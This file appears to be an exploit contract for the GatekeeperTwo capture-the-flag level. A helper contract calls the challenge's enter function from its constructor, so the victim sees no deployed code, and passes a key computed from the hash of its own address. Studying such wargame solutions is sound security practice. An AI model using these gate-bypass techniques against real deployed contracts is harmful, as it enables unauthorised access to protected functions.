// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/GateKeeperTwo/GateKeeperTwo.sol";

contract GateKeeperTwoExploit {
    GateKeeperTwo victim;

    constructor(address _victim) {
        victim = GateKeeperTwo(payable(_victim));
    }

    function hack() public {
        new GatekeeperTwoAttackHelper(address(victim));
    }

    receive() external payable {
    }
}

contract GatekeeperTwoAttackHelper {
    constructor(address _victim) {
        GateKeeperTwo victim = GateKeeperTwo(_victim);
        bytes8 gateKey = bytes8(uint64(~uint64(bytes8(keccak256(abi.encodePacked(address(this)))))));
        victim.enter(gateKey);
    }
}